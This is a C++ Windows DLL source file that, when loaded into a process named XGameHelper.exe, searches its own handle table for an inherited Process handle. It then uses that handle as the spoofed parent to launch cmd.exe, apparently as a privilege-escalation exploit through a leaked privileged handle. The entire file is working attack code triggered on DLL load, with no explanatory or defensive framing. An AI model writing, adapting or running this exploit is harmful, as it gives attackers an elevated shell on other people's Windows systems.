// dllmain.cpp : Defines the entry point for the DLL application.
#include "pch.h"
#include <winternl.h>
#include <stdlib.h>
#define SystemHandleInformation 0x10
#define STATUS_SUCCESS ((NTSTATUS)0x00000000L)
#define STATUS_INFO_LENGTH_MISMATCH ((NTSTATUS)0xC0000004L)
typedef struct _SYSTEM_HANDLE_TABLE_ENTRY_INFO
{
    USHORT UniqueProcessId;
    USHORT CreatorBackTraceIndex;
    UCHAR ObjectTypeIndex;
    UCHAR HandleAttributes;
    USHORT HandleValue;
    PVOID Object;
    ULONG GrantedAccess;
} SYSTEM_HANDLE_TABLE_ENTRY_INFO, * PSYSTEM_HANDLE_TABLE_ENTRY_INFO;
typedef struct _OBJECT_NAME_INFORMATION {



    UNICODE_STRING          Name;
    WCHAR                   NameBuffer[0];

} OBJECT_NAME_INFORMATION, * POBJECT_NAME_INFORMATION;

typedef struct _SYSTEM_HANDLE_INFORMATION
{
    ULONG NumberOfHandles;
    SYSTEM_HANDLE_TABLE_ENTRY_INFO Handles[1];
} SYSTEM_HANDLE_INFORMATION, * PSYSTEM_HANDLE_INFORMATION;
typedef struct _OBJECT_TYPE_INFORMATION {
    UNICODE_STRING TypeName;
    ULONG TotalNumberOfObjects;
    ULONG TotalNumberOfHandles;
    ULONG TotalPagedPoolUsage;
    ULONG TotalNonPagedPoolUsage;
    ULONG TotalNamePoolUsage;
    ULONG TotalHandleTableUsage;
    ULONG HighWaterNumberOfObjects;
    ULONG HighWaterNumberOfHandles;
    ULONG HighWaterPagedPoolUsage;
    ULONG HighWaterNonPagedPoolUsage;
    ULONG HighWaterNamePoolUsage;
    ULONG HighWaterHandleTableUsage;
    ULONG InvalidAttributes;
    GENERIC_MAPPING GenericMapping;
    ULONG ValidAccessMask;
    BOOLEAN SecurityRequired;
    BOOLEAN MaintainHandleCount;
    USHORT InvalidAttributes2;
    ULONG PoolType;
    ULONG DefaultPagedPoolCharge;
    ULONG DefaultNonPagedPoolCharge;
} OBJECT_TYPE_INFORMATION, * POBJECT_TYPE_INFORMATION;
typedef NTSTATUS(WINAPI* PFN_NtQuerySystemInformation)(
    ULONG SystemInformationClass,
    PVOID SystemInformation,
    ULONG SystemInformationLength,
    PULONG ReturnLength
    );

typedef NTSTATUS(WINAPI* PFN_NtDuplicateObject)(
    HANDLE SourceProcessHandle,
    HANDLE SourceHandle,
    HANDLE TargetProcessHandle,
    PHANDLE TargetHandle,
    ACCESS_MASK DesiredAccess,
    ULONG HandleAttributes,
    ULONG Options
    );

typedef NTSTATUS(WINAPI* PFN_NtQueryObject)(
    HANDLE ObjectHandle,
    ULONG ObjectInformationClass,
    PVOID ObjectInformation,
    ULONG ObjectInformationLength,
    PULONG ReturnLength
    );

typedef BOOLEAN(WINAPI* PFN_RtlEqualUnicodeString)(
    PCUNICODE_STRING String1,
    PCUNICODE_STRING String2,
    BOOLEAN CaseInSensitive
    );

typedef VOID(WINAPI* PFN_RtlInitUnicodeString)(
    PUNICODE_STRING DestinationString,
    PCWSTR SourceString
    );

int FindProcessByName();
typedef LONG(NTAPI* NtSuspendProcess)(IN HANDLE ProcessHandle);

NtSuspendProcess pfnNtSuspendProcess = (NtSuspendProcess)GetProcAddress(
    GetModuleHandle(L"ntdll"), "NtSuspendProcess");
BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        FindProcessByName();
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}
HANDLE GetHandle()
{
    ULONG handleInfoSize = 0x10000;
    NTSTATUS status;
    PSYSTEM_HANDLE_INFORMATION phHandleInfo = (PSYSTEM_HANDLE_INFORMATION)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, handleInfoSize);
    HANDLE hProc = NULL;
    POBJECT_TYPE_INFORMATION objectTypeInfo;
    PVOID objectNameInfo;
    UNICODE_STRING objectName;
    ULONG returnLength;
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    DWORD dwOwnPID = GetCurrentProcessId();

    PFN_NtQuerySystemInformation pNtQuerySystemInformation =
        (PFN_NtQuerySystemInformation)GetProcAddress(
            hNtdll,
            "NtQuerySystemInformation"
        );

    PFN_NtDuplicateObject pNtDuplicateObject =
        (PFN_NtDuplicateObject)GetProcAddress(
            hNtdll,
            "NtDuplicateObject"
        );

    PFN_NtQueryObject pNtQueryObject =
        (PFN_NtQueryObject)GetProcAddress(
            hNtdll,
            "NtQueryObject"
        );

    PFN_RtlEqualUnicodeString pRtlEqualUnicodeString =
        (PFN_RtlEqualUnicodeString)GetProcAddress(
            hNtdll,
            "RtlEqualUnicodeString"
        );

    PFN_RtlInitUnicodeString pRtlInitUnicodeString =
        (PFN_RtlInitUnicodeString)GetProcAddress(
            hNtdll,
            "RtlInitUnicodeString"
        );



    

    while ((status = pNtQuerySystemInformation(SystemHandleInformation, phHandleInfo, handleInfoSize,
        NULL)) == STATUS_INFO_LENGTH_MISMATCH)
        phHandleInfo = (PSYSTEM_HANDLE_INFORMATION)realloc(phHandleInfo, handleInfoSize *= 2);

    if (status != STATUS_SUCCESS)
    {
       
        return 0;
    }


    
    for (int i = 0; i < phHandleInfo->NumberOfHandles; ++i)
    {
        SYSTEM_HANDLE_TABLE_ENTRY_INFO handle = phHandleInfo->Handles[i];

        
        if (handle.UniqueProcessId != dwOwnPID)
            continue;

        objectTypeInfo = (POBJECT_TYPE_INFORMATION)malloc(0x1000);
        if (pNtQueryObject((HANDLE)handle.HandleValue,
            ObjectTypeInformation,
            objectTypeInfo,
            0x1000,
            NULL) != STATUS_SUCCESS)
            continue;

       
        if (handle.GrantedAccess == 0x0012019f
            && handle.GrantedAccess != 0x00120189
            && handle.GrantedAccess != 0x120089
            && handle.GrantedAccess != 0x1A019F) {
            free(objectTypeInfo);
            continue;
        }

      
        objectNameInfo = malloc(0x1000);
        if (pNtQueryObject((HANDLE)handle.HandleValue,
            1,
            objectNameInfo,
            0x1000,
            &returnLength) != STATUS_SUCCESS) {

            objectNameInfo = realloc(objectNameInfo, returnLength);
            if (pNtQueryObject((HANDLE)handle.HandleValue,
                1,
                objectNameInfo,
                returnLength,
                NULL) != STATUS_SUCCESS) {
                free(objectTypeInfo);
                free(objectNameInfo);
                continue;
            }
        }

     
        objectName = *(PUNICODE_STRING)objectNameInfo;
        UNICODE_STRING pProcess;
        
        pRtlInitUnicodeString(&pProcess, L"Process");
        if (pRtlEqualUnicodeString(&objectTypeInfo->TypeName, &pProcess, TRUE)) {
           
            hProc = (HANDLE)handle.HandleValue;
            free(objectTypeInfo);
            free(objectNameInfo);
            break;
        }
        else
            continue;

        free(objectTypeInfo);
        free(objectNameInfo);
    }

    return hProc;
}
int FindProcessByName() {
	wchar_t path[MAX_PATH];
	DWORD written;
    HANDLE hProc = NULL;
    STARTUPINFOEXA si;
    PROCESS_INFORMATION pi;
    int pid = 0;
    SIZE_T size;
    BOOL ret;
	GetModuleFileName(NULL, path, MAX_PATH);
	if (wcswcs(path, L"XGameHelper.exe"))
	{
        hProc = GetHandle();
        if (hProc != NULL) {

           
            ZeroMemory(&si, sizeof(STARTUPINFOEXA));

            InitializeProcThreadAttributeList(NULL, 1, 0, &size);
            si.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, size);

            InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &size);
            UpdateProcThreadAttribute(si.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hProc, sizeof(HANDLE), NULL, NULL);

            si.StartupInfo.cb = sizeof(STARTUPINFOEXA);

          
            ret = CreateProcessA("C:\\Windows\\system32\\cmd.exe", NULL, NULL, NULL, TRUE,
                EXTENDED_STARTUPINFO_PRESENT | CREATE_NEW_CONSOLE, NULL, NULL, (LPSTARTUPINFOA)(&si), &pi);

            if (ret == FALSE) {
              
                return -1;
            }
        }

	}
    return 0;
}
